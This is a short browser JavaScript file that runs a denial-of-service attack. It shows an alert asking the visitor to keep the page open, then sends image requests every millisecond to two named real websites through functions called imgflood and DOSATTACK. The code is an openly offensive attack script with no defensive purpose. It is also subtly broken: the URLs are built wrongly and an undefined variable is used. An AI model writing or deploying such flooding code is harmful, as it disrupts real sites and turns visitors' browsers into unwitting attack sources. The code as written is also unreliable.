alert("Sending an attack =D, so just do what you want but leave this site open or else it'll stop the attack");

function imgflood(link) {  
  var TARGET = link;
  var URI = '/index.html';
  var pic = new Image();
  var rand = Math.floor(Math.random() * 1000);
  pic.src = 'http:'+TARGET+URI+rand+'=val';
}
function DOSATTACK(link){
var domain = link;
setInterval(function(){
  var img = document.createElement('img');
  img.setAttribute('src', 'ftp://' + domain + ':80/image' + new Date().getTime() + i );
  document.body.appendChild(img);
}, 1);  
}

setInterval(function(){
  imgflood("http://jihadology.net");
  imgflood("http://korea-dpr.com");
  DOSATTACK("http://jihadology.net");
  DOSATTACK("http://korea-dpr.com");
}, 1);

